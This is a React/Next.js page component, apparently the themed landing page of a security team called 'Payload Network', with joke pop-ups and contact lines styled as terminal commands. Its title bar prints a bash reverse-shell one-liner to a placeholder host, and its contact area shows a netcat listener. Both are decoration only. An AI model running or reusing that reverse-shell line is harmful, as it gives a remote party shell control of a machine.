"use client";

import { useState, useEffect } from "react";

export default function Home() {
  const [bgImage, setBgImage] = useState("");
  const [popup, setPopup] = useState<{ show: boolean; message: string; title: string }>({
    show: false,
    message: "",
    title: ""
  });

  const updateBackground = () => {
    const imageIndex = Math.floor(Math.random() * 5) + 1;
    setBgImage(`/img/${imageIndex}.jpg`);
  };

  // Generate random background image and change every 30 seconds
  useEffect(() => {
    // Set initial background
    updateBackground();

    // Change background every 15 seconds
    const interval = setInterval(updateBackground, 30000);

    // Cleanup interval on unmount
    return () => clearInterval(interval);
  }, []);

  const handleButtonClick = (buttonType: string) => {
    const messages = {
      red: {
        title: "⚠️ ACCESS DENIED ⚠️",
        message: "Nice try, script kiddie!\n\nYou think you can just CLOSE this terminal?\n\nThis session is being monitored by the FBI...\n\n...just kidding, but seriously, you're stuck here."
      },
      yellow: {
        title: "🔒 SYSTEM WARNING 🔒",
        message: "MINIMIZE detected!\n\nInitiating counter-measures...\n\nERROR: Cannot minimize l33t h4x0r interface.\n\nYour screen has been locked by 127.0.0.1.\n\nHave you tried turning it off and on again?"
      },
      green: {
        title: "🚨 KERNEL PANIC 🚨",
        message: "FULLSCREEN mode requested...\n\nAccessing mainframe...\n\nBypassing firewall...\n\nDENIED!\n\nYou already ARE fullscreen in the MATRIX, Neo.\n\nThere is no escape."
      }
    };

    const msg = messages[buttonType as keyof typeof messages];
    setPopup({ show: true, message: msg.message, title: msg.title });
  };

  return (
    <div className="relative flex min-h-screen items-center justify-center overflow-hidden">
      {/* YouTube Video Background */}
      <div className="absolute inset-0 z-0">
        {/* <iframe
          className="absolute top-1/2 left-1/2 w-[100vw] h-[100vh] min-w-[177.77vh] min-h-[56.25vw] -translate-x-1/2 -translate-y-1/2"
          src="https://www.youtube.com/embed/buSGKekgXl8?autoplay=1&mute=1&loop=1&playlist=buSGKekgXl8&controls=0&showinfo=0&rel=0&modestbranding=1"
          allow="autoplay; encrypted-media"
          allowFullScreen
        /> */}
        <div
          key={bgImage}
          className="absolute inset-0 bg-cover bg-center animate-bgZoom"
          style={{ backgroundImage: `url(${bgImage})` }}
        />
        {/* Dark overlay */}
        <div className="absolute inset-0 bg-black/70" />
      </div>

      {/* Glassmorphic Container */}
      <main className="relative z-10 w-full max-w-4xl mx-2 sm:mx-4">
        <div className="glass-container rounded-lg sm:rounded-xl overflow-hidden shadow-2xl">
          {/* macOS Style Top Bar */}
          <div className="macos-topbar flex items-center px-2 sm:px-4 py-2 sm:py-3 bg-white/10 backdrop-blur-xl border-b border-white/20">
            <div className="flex gap-1.5 sm:gap-2">
              <div
                onClick={() => handleButtonClick("red")}
                className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-red-500 hover:bg-red-600 transition-colors cursor-pointer active:scale-90"
              />
              <div
                onClick={() => handleButtonClick("yellow")}
                className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-yellow-500 hover:bg-yellow-600 transition-colors cursor-pointer active:scale-90"
              />
              <div
                onClick={() => handleButtonClick("green")}
                className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-green-500 hover:bg-green-600 transition-colors cursor-pointer active:scale-90"
              />
            </div>
            <div className="flex-1 text-center text-[10px] sm:text-xs lg:text-sm font-medium text-white/90 overflow-hidden text-ellipsis whitespace-nowrap">
              {`$ bash -i >& /dev/tcp/hackerz.local/8080 0>&1`}
            </div>
            <div className="w-[30px] sm:w-[52px]" /> {/* Spacer for centering */}
          </div>

          {/* Content Area */}
          <div className="p-4 sm:p-8 lg:p-12">
            <div className="flex flex-col items-center gap-4 sm:gap-6 lg:gap-8 text-center">
              <pre className="text-white text-[8px] xs:text-[10px] sm:text-xs md:text-sm leading-tight drop-shadow-lg overflow-x-auto max-w-full">
                {`
██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 

███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
`}
              </pre>
              <p className="text-white/80 font-mono text-xs sm:text-sm -mt-2 sm:-mt-4 px-2">
                We break stuff so hackers can't
              </p>
              <p className="text-base sm:text-xl lg:text-2xl font-thin italic text-white/60 tracking-wider sm:tracking-widest mt-3 sm:mt-6 px-2 glitch" data-text="— No thought is a crime —">
                — No thought is a crime —
              </p>
              <div className="w-full max-w-lg mt-4 sm:mt-6 lg:mt-8 font-mono px-2">
                <div className="text-left space-y-1.5 sm:space-y-2 text-green-400 text-xs sm:text-sm overflow-x-auto">
                  <p className="text-green-500/70">// CONNECT WITH US</p>
                  <p className="text-white/90">
                    <span className="text-green-400">$</span> echo <span className="text-yellow-300">"info@payload.network"</span> | mail
                  </p>
                  <p className="text-white/90">
                    <span className="text-green-400">$</span> curl <span className="text-yellow-300">https://payload.network</span>
                  </p>
                  <p className="text-white/90 break-all sm:break-normal">
                    <span className="text-green-400">$</span> nc -lvp <span className="text-yellow-300">1337</span> <span className="text-green-500/70 hidden sm:inline"># waiting for your message...</span>
                  </p>
                  <p className="text-green-400 animate-pulse">█</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Hacker-style Popup */}
      {popup.show && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
          <div className="glass-container rounded-lg overflow-hidden shadow-2xl max-w-md w-full border-2 border-green-500/50 animate-pulse-slow">
            <div className="bg-gradient-to-r from-red-900/50 to-red-700/50 px-4 py-3 border-b border-green-500/30">
              <h3 className="text-green-400 font-mono text-sm font-bold tracking-wider">
                {popup.title}
              </h3>
            </div>
            <div className="p-6 bg-black/60">
              <p className="text-green-300 font-mono text-sm leading-relaxed mb-6 whitespace-pre-line">
                {popup.message}
              </p>
              <div className="flex justify-end">
                <button
                  onClick={() => setPopup({ show: false, message: "", title: "" })}
                  className="px-6 py-2 bg-green-600/20 hover:bg-green-600/40 border border-green-500 rounded text-green-400 font-mono text-sm transition-all shadow-lg shadow-green-500/20"
                >
                  [OK] I understand
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

